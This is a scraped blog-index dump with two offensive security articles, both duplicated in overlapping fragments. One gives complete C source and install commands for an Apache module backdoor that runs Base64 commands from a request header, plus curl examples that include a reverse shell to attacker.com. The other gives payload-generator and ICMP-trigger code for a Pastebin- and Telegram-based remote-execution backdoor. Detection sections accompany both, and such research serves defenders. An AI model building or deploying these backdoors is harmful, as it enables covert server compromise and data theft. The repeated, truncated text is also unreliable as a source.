technique demonstrates the importance of defense-in-depth Custom headers and Base64 encoding add layers of obfuscation Consider operational security: module names, header names, and compilation artifacts all create detection opportunities For Blue Teams:\nTraditional webshell detection methods are insufficient against module-based backdoors File integrity monitoring and behavioral analysis are critical Baseline your environment to detect anomalous module installations Process execution monitoring can catch compilation activities Network traffic analysis can identify suspicious Base64-encoded communications Future Research Directions This technique can be extended further:\nMemory-only operation: Loading modules without disk persistence Encrypted communications: Replacing Base64 with AES encryption Polymorphic modules: Generating unique module signatures per deployment Multi-protocol support: Extending beyond HTTP to HTTPS, WebSockets, HTTP/2 Anti-forensics: Implementing self-deletion and log manipulation capabilities The arms race between attackers and defenders continues. Understanding these advanced persistence techniques is essential for both offensive security practitioners and defensive teams. As with all security research, use this knowledge responsibly and only in authorized contexts.\nReferences From HTTP to RCE. How to leave backdoor in IIS Backdoors in XAMP stack (part III): Apache Modules Malicious Apache Module: a clarification Developing modules for the Apache HTTP Server 2.4 ","permalink":"http://localhost:1313/posts/apache-modules-persistence/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eDISCLAIMER:\u003c/strong\u003e\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Article\" loading=\"lazy\" src=\"/apache-persistence-cover.png\"\u003e\u003c/p\u003e\n\u003cp\u003eWhile studying APT and Red Team materials, I came across an excellent article from \u003ca href=\"https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9\"\u003eCICADA8\u003c/a\u003e about establishing persistence in infrastructure through IIS modules instead of classic webshells.\u003c/p\u003e","title":"Persistent Backdoors via Apache Modules 🕷️"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWe’ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Micro’s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM — without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodes—other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previous section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasion—using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 – Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe – Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; – Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 👾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nIntro While studying APT and Red Team materials, I came across an excellent article from CICADA8 about establishing persistence in infrastructure through IIS modules instead of classic webshells.\nIn the Windows ecosystem, the typical approach involves writing a DLL and registering it as a service or system component to extend native APIs. This sparked an idea: what if we implemented a similar technique for Linux environments using Apache modules?\nI\u0026rsquo;m not the first to explore this vector. Researchers from ESET documented this technique back in 2012, but as they say, everything old is new again. Despite its potential, this technique remains relatively undocumented and underexplored in modern security literature. After some research, I discovered that Apache supports extending its functionality through modules (mods), which are primarily written in C.\nWhy Apache Modules Over Traditional Webshells? The advantages of this approach compared to conventional webshells are compelling:\nProcess-level execution: The module runs inside the web server process and doesn\u0026rsquo;t reside in the public webroot, making it significantly harder to discover through simple file enumeration URL-agnostic operation: Not tied to a specific endpoint, providing flexibility in backdoor logic implementation Stealth: Much harder to detect through standard Apache access logs since the malicious activity occurs at the module level Persistence: Survives webroot cleanups and application redeployments This article explores these attack vectors for research purposes and does not encourage malicious activity. Let\u0026rsquo;s dive into the technical implementation.\nModule Development To develop a functional Apache2 module backdoor, we first need to define our core requirements. For this Proof of Concept, I established the following functionality goals:\nTechnical Requirements Base64 encoding: Commands should be transmitted in Base64 format, and output should be returned encoded as well Global interception: The module should intercept all requests to the web application without being tied to a specific URL endpoint Header-based communication: The server receives commands via HTTP request headers and returns output to the client Minimal footprint: Avoid obvious indicators of compromise in standard logs Implementation Overview With our technical requirements formalized, we can proceed with the backdoor implementation. Full disclosure: I leveraged AI chatbots and LLMs to accelerate the development process.\nCore Imports #include \u0026#34;httpd.h\u0026#34; #include \u0026#34;http_config.h\u0026#34; #include \u0026#34;http_protocol.h\u0026#34; #include \u0026#34;ap_config.h\u0026#34; #include \u0026#34;http_request.h\u0026#34; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; These headers provide the necessary Apache API functions and standard C libraries for our module.\nBase64 Decoder Implementation The decoder converts Base64-encoded commands received from the attacker into plaintext for execution:\nstatic unsigned char *b64decode(apr_pool_t *pool, const char *input, size_t *out_len) { size_t len = strlen(input); unsigned char *output = apr_pcalloc(pool, len); static const char b64_table[256] = { [\u0026#39;A\u0026#39;]=0, [\u0026#39;B\u0026#39;]=1, [\u0026#39;C\u0026#39;]=2, [\u0026#39;D\u0026#39;]=3, [\u0026#39;E\u0026#39;]=4, [\u0026#39;F\u0026#39;]=5, [\u0026#39;G\u0026#39;]=6, [\u0026#39;H\u0026#39;]=7, [\u0026#39;I\u0026#39;]=8, [\u0026#39;J\u0026#39;]=9, [\u0026#39;K\u0026#39;]=10, [\u0026#39;L\u0026#39;]=11, [\u0026#39;M\u0026#39;]=12, [\u0026#39;N\u0026#39;]=13, [\u0026#39;O\u0026#39;]=14, [\u0026#39;P\u0026#39;]=15, [\u0026#39;Q\u0026#39;]=16, [\u0026#39;R\u0026#39;]=17, [\u0026#39;S\u0026#39;]=18, [\u0026#39;T\u0026#39;]=19, [\u0026#39;U\u0026#39;]=20, [\u0026#39;V\u0026#39;]=21, [\u0026#39;W\u0026#39;]=22, [\u0026#39;X\u0026#39;]=23, [\u0026#39;Y\u0026#39;]=24, [\u0026#39;Z\u0026#39;]=25, [\u0026#39;a\u0026#39;]=26, [\u0026#39;b\u0026#39;]=27, [\u0026#39;c\u0026#39;]=28, [\u0026#39;d\u0026#39;]=29, [\u0026#39;e\u0026#39;]=30, [\u0026#39;f\u0026#39;]=31, [\u0026#39;g\u0026#39;]=32, [\u0026#39;h\u0026#39;]=33, [\u0026#39;i\u0026#39;]=34, [\u0026#39;j\u0026#39;]=35, [\u0026#39;k\u0026#39;]=36, [\u0026#39;l\u0026#39;]=37, [\u0026#39;m\u0026#39;]=38, [\u0026#39;n\u0026#39;]=39, [\u0026#39;o\u0026#39;]=40, [\u0026#39;p\u0026#39;]=41, [\u0026#39;q\u0026#39;]=42, [\u0026#39;r\u0026#39;]=43, [\u0026#39;s\u0026#39;]=44, [\u0026#39;t\u0026#39;]=45, [\u0026#39;u\u0026#39;]=46, [\u0026#39;v\u0026#39;]=47, [\u0026#39;w\u0026#39;]=48, [\u0026#39;x\u0026#39;]=49, [\u0026#39;y\u0026#39;]=50, [\u0026#39;z\u0026#39;]=51, [\u0026#39;0\u0026#39;]=52, [\u0026#39;1\u0026#39;]=53, [\u0026#39;2\u0026#39;]=54, [\u0026#39;3\u0026#39;]=55, [\u0026#39;4\u0026#39;]=56, [\u0026#39;5\u0026#39;]=57, [\u0026#39;6\u0026#39;]=58, [\u0026#39;7\u0026#39;]=59, [\u0026#39;8\u0026#39;]=60, [\u0026#39;9\u0026#39;]=61, [\u0026#39;+\u0026#39;]=62, [\u0026#39;/\u0026#39;]=63 }; size_t i = 0, j = 0; uint32_t buf = 0; int bits = 0; while (i \u0026lt; len) { char c = input[i++]; if (c == \u0026#39;=\u0026#39; || c == \u0026#39;\\0\u0026#39;) break; if ((unsigned char)c \u0026gt; 127 || (b64_table[(unsigned char)c] == 0 \u0026amp;\u0026amp; c != \u0026#39;A\u0026#39;)) continue; buf = (buf \u0026lt;\u0026lt; 6) | b64_table[(unsigned char)c]; bits += 6; if (bits \u0026gt;= 8) { bits -= 8; output[j++] = (buf \u0026gt;\u0026gt; bits) \u0026amp; 0xFF; } } if (out_len) *out_len = j; return output; } Base64 Encoder Implementation The encoder converts command output back to Base64 for transmission to the attacker:\nstatic char *b64encode(apr_pool_t *pool, const unsigned char *input, size_t len) { static const char b64_chars[] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; size_t out_len = 4 * ((len + 2) / 3); char *output = apr_pcalloc(pool, out_len + 1); size_t i = 0, j = 0; while (i \u0026lt; len) { uint32_t octet_a = i \u0026lt; len ? input[i++] : 0; uint32_t octet_b = i \u0026lt; len ? input[i++] : 0; uint32_t octet_c = i \u0026lt; len ? input[i++] : 0; uint32_t triple = (octet_a \u0026lt;\u0026lt; 16) | (octet_b \u0026lt;\u0026lt; 8) | octet_c; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 18) \u0026amp; 0x3F]; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len + 1) ? \u0026#39;=\u0026#39; : b64_chars[(triple \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len) ? \u0026#39;=\u0026#39; : b64_chars[triple \u0026amp; 0x3F]; } output[out_len] = \u0026#39;\\0\u0026#39;; return output; } Request Hook Handler This is the core logic that intercepts HTTP requests, extracts commands, executes them, and returns the output:\nstatic int admin_exec_hook(request_rec *r) { // Skip subrequests if (r-\u0026gt;main) return DECLINED; // Check for our trigger header const char *hdr_enc = apr_table_get(r-\u0026gt;headers_in, \u0026#34;X-Request-ID\u0026#34;); if (!hdr_enc) return DECLINED; // Decode the command size_t cmd_len; unsigned char *cmd = b64decode(r-\u0026gt;pool, hdr_enc, \u0026amp;cmd_len); if (!cmd || cmd_len == 0) return DECLINED; ap_set_content_type(r, \u0026#34;text/plain\u0026#34;); // Execute command via popen FILE *fp = popen((const char *)cmd, \u0026#34;r\u0026#34;); if (!fp) { ap_rputs(\u0026#34;failed\\n\u0026#34;, r); return OK; } // Capture command output char buffer[8192]; size_t total_len = 0; size_t cap = 8192; unsigned char *output = apr_pcalloc(r-\u0026gt;pool, cap); while (fgets(buffer, sizeof(buffer), fp)) { size_t blen = strlen(buffer); if (total_len + blen \u0026gt;= cap) { cap *= 2; unsigned char *newbuf = apr_palloc(r-\u0026gt;pool, cap); memcpy(newbuf, output, total_len); output = newbuf; } memcpy(output + total_len, buffer, blen); total_len += blen; } pclose(fp); // Encode and return output char *encoded = b64encode(r-\u0026gt;pool, output, total_len); ap_rputs(encoded, r); return OK; } Module Registration Finally, we register our hook with Apache:\nstatic void register_hooks(apr_pool_t *p) { ap_hook_header_parser(admin_exec_hook, NULL, NULL, APR_HOOK_MIDDLE); } module AP_MODULE_DECLARE_DATA admin_exec_module = { STANDARD20_MODULE_STUFF, NULL, NULL, NULL, NULL, NULL, register_hooks }; I called this whole project MODPlant, and deployed it in Github, you may download it here.\nProof of Concept Exploitation Prerequisites Installation First of all, install the Apache development tools required for module compilation:\nsudo apt update sudo apt install apache2-dev -y This installs the apxs (Apache Extension Tool) utility, which is essential for building and installing Apache modules.\nModule Compilation and Installation Compile and install the module with a single command:\nsudo apxs -i -a -c mod_shell.c This command performs three critical operations:\nCompilation: Converts our C source code into a .so (shared object) library Installation: Copies the compiled module to Apache\u0026rsquo;s module directory Configuration: Automatically adds a LoadModule directive to Apache\u0026rsquo;s configuration Service Restart After executing the apxs command, Apache needs to be restarted to load the new module:\nsudo systemctl restart apache2 Verify the service is running correctly:\nsudo systemctl status apache2 Testing the Backdoor Now we can interact with our backdoor. Commands are sent Base64-encoded via the X-Request-ID HTTP header. The header name can be modified in mod_shell.c to avoid detection.\nExample using curl:\n# Encode command: echo \u0026#34;whoami\u0026#34; | base64 # Result: d2hvYW1p curl -H \u0026#34;X-Request-ID: d2hvYW1p\u0026#34; http://target-server.com/ The server responds with Base64-encoded output: d3d3LWRhdGE=\nDecoding the Response Decode the server\u0026rsquo;s response to view command output:\necho \u0026#34;d3d3LWRhdGE=\u0026#34; | base64 -d # Output: www-data This demonstrates successful command execution with full output exfiltration. The Base64 encoding provides several benefits:\nObfuscates command content from casual log inspection Handles binary data and special characters safely Maintains compatibility with HTTP protocol requirements Advanced Usage Examples File enumeration:\n# Command: ls -la /etc/passwd echo \u0026#34;bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; http://target/ But, you also supposed to ensure the proper access for the user by which the apache service is running, in my case www-data default user does not have those excessive privileges, but it is also the vector for backdooring the target server.\nReverse shell establishment:\n# Command: bash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1 echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; http://target/ Detection and Hunting Perspective Indicators of Attack (IOA) Defenders should monitor for the following suspicious activities:\n1. Suspicious apxs Execution The apxs tool is rarely used in production environments outside of initial server setup. Monitor process execution logs for:\n# Detection via Sysmon or auditd apxs -i -a -c *.c Detection logic:\nUnusual parent processes spawning apxs apxs execution by non-administrative users Compilation of .c files in unexpected directories (e.g., /tmp, /var/www) 2. Apache Service Restarts Unexpected Apache service restarts, especially outside maintenance windows:\nsystemctl restart apache2 service apache2 restart /etc/init.d/apache2 restart Monitoring points:\nCorrelate service restarts with user activity Alert on restarts without corresponding change tickets Track which user initiated the restart 3. File System Artifacts Monitor critical Apache directories for new or modified files:\nModule configuration:\n/etc/apache2/mods-available/*.load /etc/apache2/mods-enabled/*.load Compiled modules:\n/usr/lib/apache2/modules/*.so Detection strategy:\nBaseline legitimate modules during system provisioning Alert on new .so files with recent creation timestamps Check module file signatures against known-good hashes Inspect .load files for suspicious module names 4. Behavioral Anomalies Network indicators:\nUnusual outbound connections from Apache process HTTP requests with suspicious custom headers (e.g., X-Request-ID with long Base64 strings) Consistent Base64-encoded responses in HTTP traffic Conclusion Apache module-based backdoors represent a sophisticated persistence technique that combines stealth, flexibility, and resilience. By operating at the web server process level rather than as traditional webshells, these backdoors evade many common detection mechanisms.\nKey Takeaways For Red Teams:\nApache modules provide excellent persistence in authorized assessments The technique demonstrates the importance of defense-in-depth Custom headers and Base64 encoding add layers of obfuscation Consider operational security: module names, header names, and compilation artifacts all create detection opportunities For Blue Teams:\nTraditional webshell detection methods are insufficient against module-based backdoors File integrity monitoring and behavioral analysis are critical Baseline your environment to detect anomalous module installations Process execution monitoring can catch compilation activities Network traffic analysis can identify suspicious Base64-encoded communications Future Research Directions This technique can be extended further:\nMemory-only operation: Loading modules without disk persistence Encrypted communications: Replacing Base64 with AES encryption Polymorphic modules: Generating unique module signatures per deployment Multi-protocol support: Extending beyond HTTP to HTTPS, WebSockets, HTTP/2 Anti-forensics: Implementing self-deletion and log manipulation capabilities The arms race between attackers and defenders continues. Understanding these advanced persistence techniques is essential for both offensive security practitioners and defensive teams. As with all security research, use this knowledge responsibly and only in authorized contexts.\nReferences From HTTP to RCE. How to leave backdoor in IIS Backdoors in XAMP stack (part III): Apache Modules Malicious Apache Module: a clarification Developing modules for the Apache HTTP Server 2.4 ","permalink":"http://localhost:1313/posts/apache-modules-persistence/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eDISCLAIMER:\u003c/strong\u003e\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Article\" loading=\"lazy\" src=\"/apache-persistence-cover.png\"\u003e\u003c/p\u003e\n\u003cp\u003eWhile studying APT and Red Team materials, I came across an excellent article from \u003ca href=\"https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9\"\u003eCICADA8\u003c/a\u003e about establishing persistence in infrastructure through IIS modules instead of classic webshells.\u003c/p\u003e","title":"Persistent Backdoors via Apache Modules 🕷️"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWe’ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Micro’s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM — without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodes—other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; 